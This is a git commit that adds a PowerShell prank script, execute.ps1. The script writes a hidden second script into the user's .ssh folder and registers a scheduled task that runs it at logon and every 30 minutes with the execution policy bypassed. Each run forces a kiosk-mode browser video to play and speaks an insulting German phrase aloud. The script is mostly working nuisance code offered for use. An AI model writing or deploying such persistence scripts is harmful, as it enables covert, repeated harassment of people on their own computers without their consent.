3ad428ce6c78b7c66ed0b8dc4c2d068f9d194af7
joshua.dm <43703193+joshuademarco@users.noreply.github.com>
2023-06-06 11:52:53 +0200

    Create execute.ps1

---
+++ execute.ps1
@@ -0,0 +1,10 @@
+$dir = "C:\\Users\\$env:USERNAME\\.ssh\script.ps1"
+
+unregister-scheduledtask -TaskName "Task2" -confirm:$false -ErrorAction SilentlyContinue
+
+Set-Content -Path $dir -Value "Start-Process iexplore -ArgumentList '-k https://player.vimeo.com/video/198392879?autoplay=1 -WindowStyle Maximized'; Add-Type -AssemblyName System.speech; $TTS = New-Object System.Speech.Synthesis.SpeechSynthesizer; \$TTS.Speak('Du bist eine Lusche. Viel spass beim video.'); Exit"
+
+$Sta = New-ScheduledTaskAction 'PowerShell.exe' ('-noprofile -executionpolicy bypass -file ' + $dir)
+$Stt = New-ScheduledTaskTrigger -AtLogOn -User ($env:USERNAME)
+$Stt.Repetition = (New-ScheduledTaskTrigger -once -at "8am" -RepetitionInterval (New-TimeSpan -Minutes 30) -RepetitionDuration (New-TimeSpan -Hours 5)).repetition
+Register-ScheduledTask -TaskName "Task2" -Trigger $Stt -Action $Sta
